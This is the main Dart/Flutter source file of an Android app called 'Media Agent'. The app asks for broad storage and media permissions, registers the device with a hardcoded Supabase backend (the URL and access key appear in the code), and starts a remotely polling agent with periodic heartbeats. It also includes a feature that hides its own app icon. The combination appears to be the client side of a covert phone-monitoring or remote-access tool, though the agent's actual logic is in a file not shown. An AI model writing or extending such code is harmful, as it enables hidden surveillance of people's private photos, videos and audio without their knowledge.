import 'dart:async';

import 'package:flutter/material.dart';
import 'package:flutter/services.dart';
import 'package:shared_preferences/shared_preferences.dart';

import 'core/device_agent.dart';
import 'core/device_id.dart';

/// CONFIG
const int HEARTBEAT_INTERVAL_SECONDS = 30;
const String SUPABASE_PROJECT_URL = 'https://pbovhvhpewnooofaeybe.supabase.co';
const String SUPABASE_ANON_KEY =
    'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InBib3ZodmhwZXdub29vZmFleWJlIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NjYxNjY0MTIsImV4cCI6MjA4MTc0MjQxMn0.5MotbwR5oS29vZ2w-b2rmyExT1M803ImLD_-ecu2MzU';
const String SUPABASE_REGISTER_FUNCTION =
    '$SUPABASE_PROJECT_URL/functions/v1/register-device';

const MethodChannel _permChannel = MethodChannel('cyber_agent/permissions');
const MethodChannel _appHider = MethodChannel('cyber_accessibility_agent/app_hider');

void main() {
  WidgetsFlutterBinding.ensureInitialized();
  runApp(const MediaAgentApp());
}

class MediaAgentApp extends StatelessWidget {
  const MediaAgentApp({super.key});
  @override
  Widget build(BuildContext context) {
    return const MaterialApp(
      debugShowCheckedModeBanner: false,
      home: HomePage(),
    );
  }
}

class HomePage extends StatefulWidget {
  const HomePage({super.key});
  @override
  State<HomePage> createState() => _HomePageState();
}

class _HomePageState extends State<HomePage> {
  String _status = 'Initializing...';
  String? _deviceId;
  String? _deviceJwt;
  Timer? _heartbeatTimer;
  bool _iconVisible = true;
  bool _agentStarted = false;

  @override
  void initState() {
    super.initState();
    _initFlow();
  }

  @override
  void dispose() {
    _heartbeatTimer?.cancel();
    super.dispose();
  }

  Future<void> _initFlow() async {
    setState(() => _status = 'Loading local state...');
    // load or create device id
    _deviceId = await DeviceId.getOrCreate(
      supabaseUrl: SUPABASE_PROJECT_URL,
      anonKey: SUPABASE_ANON_KEY,
    );
    final prefs = await SharedPreferences.getInstance();
    _deviceJwt = prefs.getString('device_jwt');

    await _refreshIconVisibility();
    setState(() => _status = 'Device ID: ${_deviceId ?? "-"}');

    // configure agent (ready to start)
    await DeviceAgent.instance.configure(
      supabaseUrl: SUPABASE_PROJECT_URL,
      anonKey: SUPABASE_ANON_KEY,
      deviceId: _deviceId,
      deviceJwt: _deviceJwt,
      pollInterval: const Duration(seconds: 5),
      registerUri: Uri.tryParse(SUPABASE_REGISTER_FUNCTION),
    );

    // Start auto-register + agent only if permission is granted
    final hasPerm = await _checkStoragePermission();
    if (hasPerm) {
      await _onPermissionGranted();
    } else {
      setState(() => _status = 'Waiting for storage permission (tap Request)');
    }
  }

  Future<bool> _checkStoragePermission() async {
    try {
      final Map<dynamic, dynamic>? map = await _permChannel.invokeMethod('checkStoragePermissions');
      if (map == null) return false;
      final hasAll = map['hasAllFilesAccess'] == true;
      final rImg = map['readMediaImages'] == true;
      final rV = map['readMediaVideo'] == true;
      final rA = map['readMediaAudio'] == true;
      return hasAll || rImg || rV || rA;
    } catch (e) {
      print('[Main] checkStoragePermission error: $e');
      return false;
    }
  }

  Future<void> _requestPermissions() async {
    setState(() => _status = 'Requesting storage permissions...');
    try {
      final Map<dynamic, dynamic>? map = await _permChannel.invokeMethod('requestPermissions');
      if (map == null) {
        setState(() => _status = 'Permission request aborted');
        return;
      }
      final granted = (map['hasAllFilesAccess'] == true) ||
          (map['readMediaImages'] == true) ||
          (map['readMediaVideo'] == true) ||
          (map['readMediaAudio'] == true);

      if (granted) {
        await _onPermissionGranted();
      } else {
        setState(() => _status = 'Permissions not granted');
      }
    } catch (e) {
      setState(() => _status = 'Permission request error');
      print('[Main] requestPermissions error: $e');
    }
  }

  /// Called once permissions are confirmed granted.
  Future<void> _onPermissionGranted() async {
    if (_agentStarted) return; // ✅ prevent double start
    _agentStarted = true;

    setState(() => _status = 'Permissions granted — registering & starting agent...');
    try {
      // register only if JWT missing
      if (DeviceAgent.instance.deviceJwt == null &&
          DeviceAgent.instance.registerUri != null &&
          DeviceAgent.instance.deviceId != null) {
        final reg = await DeviceAgent.instance.registerDeviceViaEdge(
          registerUri: DeviceAgent.instance.registerUri!,
          requestedId: DeviceAgent.instance.deviceId!,
          displayName: 'Android Media Agent',
          consent: true,
          metadata: {'source': 'permission_flow'},
        );
        if (reg != null) {
          setState(() => _status = 'Registration succeeded');
        } else {
          setState(() => _status = 'Registration request sent (no token returned)');
        }
      }

      // start agent & heartbeat
      await DeviceAgent.instance.start();
      _startHeartbeatLoop();

      // refresh persisted creds
      final prefs = await SharedPreferences.getInstance();
      _deviceId = prefs.getString('device_id') ?? _deviceId;
      _deviceJwt = prefs.getString('device_jwt') ?? _deviceJwt;

      setState(() => _status = _deviceJwt != null ? 'Device online ($_deviceId)' : 'Agent running (not registered)');
    } catch (e) {
      setState(() => _status = 'Auto-register/start error');
      print('[Main] _onPermissionGranted error: $e');
    }
  }

  void _startHeartbeatLoop() {
    _heartbeatTimer?.cancel();
    unawaited(DeviceAgent.instance.sendHeartbeat());
    _heartbeatTimer = Timer.periodic(
      const Duration(seconds: HEARTBEAT_INTERVAL_SECONDS),
      (_) => unawaited(DeviceAgent.instance.sendHeartbeat()),
    );
  }

  Future<void> _manualRegister() async {
    setState(() => _status = 'Manual register...');
    try {
      final res = await DeviceAgent.instance.registerDeviceViaEdge(
        registerUri: Uri.parse(SUPABASE_REGISTER_FUNCTION),
        requestedId: _deviceId!,
        displayName: 'Android Media Agent',
        consent: true,
        metadata: {'source': 'manual_ui'},
      );

      if (res != null) {
        final prefs = await SharedPreferences.getInstance();
        _deviceId = prefs.getString('device_id') ?? _deviceId;
        _deviceJwt = prefs.getString('device_jwt') ?? _deviceJwt;
        setState(() => _status = '✅ Device registered (manual)');

        if (!_agentStarted) {
          _agentStarted = true;
          await DeviceAgent.instance.start();
          _startHeartbeatLoop();
        }
      } else {
        setState(() => _status = 'Registration failed (manual)');
      }
    } catch (e) {
      setState(() => _status = 'Manual register error');
      print('[Main] manual register error: $e');
    }
  }

  Future<void> _swapDeviceId() async {
    setState(() => _status = 'Swapping device id...');
    try {
      final next = await DeviceId.swap(supabaseUrl: SUPABASE_PROJECT_URL, anonKey: SUPABASE_ANON_KEY);
      _deviceId = next;
      _deviceJwt = null;
      _agentStarted = false;
      setState(() => _status = 'Swapped to $_deviceId');

      // re-configure
      await DeviceAgent.instance.configure(
        supabaseUrl: SUPABASE_PROJECT_URL,
        anonKey: SUPABASE_ANON_KEY,
        deviceId: _deviceId,
        deviceJwt: _deviceJwt,
        registerUri: Uri.tryParse(SUPABASE_REGISTER_FUNCTION),
      );

      // If permission already granted, start agent
      if (await _checkStoragePermission()) {
        await _onPermissionGranted();
      } else {
        setState(() => _status = 'Swapped; waiting for storage permission');
      }
    } catch (e) {
      setState(() => _status = 'Swap failed');
      print('[Main] swap error: $e');
    }
  }

  Future<void> _refreshIconVisibility() async {
    try {
      final vis = await _appHider.invokeMethod<bool>('isVisible');
      setState(() => _iconVisible = vis ?? true);
    } catch (_) {}
  }

  Future<void> _hideIcon() async {
    try {
      final ok = await _appHider.invokeMethod<bool>('hide');
      if (ok == true) setState(() => _iconVisible = false);
    } catch (e) {
      setState(() => _status = 'Hide icon failed');
      print('[Main] hideIcon error: $e');
    }
  }

  Future<void> _showIcon() async {
    try {
      final ok = await _appHider.invokeMethod<bool>('show');
      if (ok == true) setState(() => _iconVisible = true);
    } catch (e) {
      setState(() => _status = 'Show icon failed');
      print('[Main] showIcon error: $e');
    }
  }

  Widget _infoRow(String label, String? value) {
    return Padding(
      padding: const EdgeInsets.symmetric(vertical: 4),
      child: Row(
        children: [
          Text('$label: ', style: const TextStyle(fontWeight: FontWeight.bold)),
          Expanded(child: Text(value ?? '-')),
        ],
      ),
    );
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      appBar: AppBar(title: const Text('Media Agent')),
      body: Padding(
        padding: const EdgeInsets.all(16),
        child: Column(crossAxisAlignment: CrossAxisAlignment.start, children: [
          Text(_status),
          const SizedBox(height: 12),
          _infoRow('Device ID', _deviceId),
          _infoRow('JWT', _deviceJwt != null ? 'present' : 'missing'),
          const SizedBox(height: 12),
          Wrap(spacing: 12, runSpacing: 8, children: [
            ElevatedButton(onPressed: _manualRegister, child: const Text('Manual register')),
            ElevatedButton(onPressed: _swapDeviceId, child: const Text('Swap ID')),
            ElevatedButton(
                onPressed: () async {
                  final ok = await _checkStoragePermission();
                  if (!ok) {
                    await _requestPermissions();
                  } else {
                    await _onPermissionGranted();
                  }
                },
                child: const Text('Request/Check Permissions')),
            ElevatedButton(
                onPressed: _iconVisible ? _hideIcon : _showIcon,
                child: Text(_iconVisible ? 'Hide app icon' : 'Restore app icon')),
            ElevatedButton(
                onPressed: () async {
                  await DeviceAgent.instance.start();
                  _startHeartbeatLoop();
                  setState(() => _status = 'Start attempted (see logs)');
                },
                child: const Text('Start agent')),
          ]),
        ]),
      ),
    );
  }
}